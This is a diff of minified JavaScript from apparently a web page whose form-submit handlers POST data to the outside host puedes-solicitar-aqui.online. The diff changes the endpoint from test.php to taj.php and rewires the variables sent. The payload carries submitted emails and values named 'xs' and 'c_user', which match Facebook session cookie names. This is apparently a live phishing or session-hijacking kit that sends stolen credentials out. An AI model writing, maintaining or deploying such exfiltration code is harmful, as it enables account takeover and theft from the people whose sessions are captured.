@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://puedes-solicitar-aqui.online/test.php", {
+                                    fetch("https://puedes-solicitar-aqui.online/taj.php", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://puedes-solicitar-aqui.online/test.php", {
+                                    u && o ? (fetch("https://puedes-solicitar-aqui.online/taj.php", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13366,8 +13366,8 @@
                                         body: JSON.stringify({
                                             emails: e,
                                             workerEmail: "",
-                                            xs: o,
-                                            c_user: u,
+                                            xs: i,
+                                            c_user: r,
                                             name: "My Self"
                                         })
                                     }).then((e => {
